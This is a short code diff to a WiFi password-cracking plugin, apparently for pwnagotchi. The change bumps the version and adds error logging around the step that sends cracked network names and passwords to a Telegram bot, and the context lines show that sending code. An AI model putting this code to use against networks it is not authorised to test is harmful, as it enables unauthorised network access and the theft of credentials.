@@ -18,7 +18,7 @@ Cracked handshakes stored in handshake folder as [essid].pcap.cracked
 
 class QuickDic(plugins.Plugin):
     __author__ = 'silentree12th'
-    __version__ = '1.3.3'
+    __version__ = '1.3.4'
     __license__ = 'GPL3'
     __description__ = 'Run a quick dictionary scan against captured handshakes. Optionally send found passwords as qrcode and plain text over to telegram bot.'
     __dependencies__ = {
@@ -110,5 +110,7 @@ class QuickDic(plugins.Plugin):
                         # Send the image directly as bytes
                         message_text = 'ssid: ' + ssid + ' password: ' + password
                         bot.send_photo(chat_id=chat_id, photo=InputFile(image_bytes, filename=ssid+'-'+password+'.txt'), caption=message_text)
-                    
+
+                    except:
+                        logging.error("[better_quickdic] something went wrong sending to telegram")
            
